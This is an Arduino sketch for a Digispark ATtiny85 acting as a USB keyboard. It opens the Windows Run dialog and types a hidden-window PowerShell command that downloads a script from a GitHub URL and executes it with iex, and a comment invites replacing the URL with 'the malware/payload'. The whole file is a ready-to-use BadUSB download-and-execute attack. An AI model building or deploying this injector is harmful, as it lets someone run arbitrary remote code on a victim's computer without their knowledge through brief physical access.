#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  // Put the URL of the malware/payload here
  char *URL = "https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/powershell/speak.ps1";

  // Initialise digispark
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(600);

  // Open the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Write the command
  DigiKeyboard.print("powershell -w h ");
  DigiKeyboard.print("iex (irm \"");
  DigiKeyboard.print(URL);
  DigiKeyboard.print("\")");
  // Press Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


  for (;;) {/* Stops the loop */}
}